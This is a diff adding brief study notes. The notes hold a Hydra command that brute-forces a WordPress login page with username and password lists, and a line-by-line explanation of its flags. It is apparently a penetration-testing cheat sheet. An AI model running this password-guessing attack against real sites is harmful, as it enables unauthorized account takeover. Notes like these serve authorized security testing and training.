@@ -1,0 +1,6 @@
+hydra -F -L users.txt -P passwords.txt server.domain.local http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Error"
+-F stop after first match on username password combo
+-L and -P represents files with usernames and passwords
+http-post-form Use post with a form
+/wp-login.php:log=^USER^&pwd=^PASS^:Error     replaces USER and PASS with file data
+:Error if we do not get the string back Error then behave ass successful
